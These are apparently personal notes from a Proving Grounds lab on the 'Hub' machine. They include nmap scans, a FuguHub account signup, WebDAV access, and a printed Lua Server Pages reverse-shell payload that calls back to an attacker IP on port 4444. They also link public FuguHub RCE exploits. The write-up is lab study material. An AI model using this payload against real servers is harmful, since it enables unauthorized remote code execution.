# nmap
```
┌──(kali㉿kali)-[~/PG/hub]
└─$ nmap -p- --min-rate 10000 192.168.152.25             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-22 20:21 EST
Nmap scan report for 192.168.152.25
Host is up (0.046s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8082/tcp open  blackice-alerts
9999/tcp open  abyss

Nmap done: 1 IP address (1 host up) scanned in 8.79 seconds


┌──(kali㉿kali)-[~/PG/hub]
└─$ nmap -p 22,80,8082,9999 -sCV 192.168.152.25
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-22 20:21 EST
Nmap scan report for 192.168.152.25
Host is up (0.039s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp   open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: 403 Forbidden
8082/tcp open  http     Barracuda Embedded Web Server
| http-methods: 
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_http-title: Home
|_http-server-header: BarracudaServer.com (Posix)
| http-webdav-scan: 
|   Server Type: BarracudaServer.com (Posix)
|   WebDAV type: Unknown
|   Server Date: Sun, 23 Feb 2025 01:22:04 GMT
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
9999/tcp open  ssl/http Barracuda Embedded Web Server
| ssl-cert: Subject: commonName=FuguHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:FuguHub, DNS:FuguHub.local, DNS:localhost
| Not valid before: 2019-07-16T19:15:09
|_Not valid after:  2074-04-18T19:15:09
| http-methods: 
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
| http-webdav-scan: 
|   Server Type: BarracudaServer.com (Posix)
|   WebDAV type: Unknown
|   Server Date: Sun, 23 Feb 2025 01:22:04 GMT
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|_http-server-header: BarracudaServer.com (Posix)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.75 seconds
```
![Pasted image 20250223092316](<0. Attachments/Pasted image 20250223092316.png>)

# web enum
![Pasted image 20250223092432](<0. Attachments/Pasted image 20250223092432.png>)

i created a user admin --> admin1

logged in
![Pasted image 20250223092717](<0. Attachments/Pasted image 20250223092717.png>)

went to webdav, i can upload files
![Pasted image 20250223093328](<0. Attachments/Pasted image 20250223093328.png>)

nothing yet

# exploit

exploit taken from - https://github.com/ojan2021/Fuguhub-8.1-RCE

```
<div sytle="margin-leftLauto;margin-right: auth;width: 350px;">
 <div id="info">
 <h2>Lua Server Pages Reverse Shell</h2>
 <p>haha</p>
 </div>
 <?lsp if request:method() == "GET" then ?>
        <?lsp os.execute("bash -c 'bash -i >& /dev/tcp/192.168.45.203/4444 0>&1'")?>
 <?lsp else ?>
        you sent a <?lsp=request:method() ?> request
 <?lsp end ?>
 </div>
```
![Pasted image 20250223095830](<0. Attachments/Pasted image 20250223095830.png>)
# access
![Pasted image 20250223095756](<0. Attachments/Pasted image 20250223095756.png>)

# other ways
https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697

good writeup - [Hub | Cyanide Security - Walkthroughs](https://walkthroughs.cyanidesecurity.com/proving-grounds/hub)
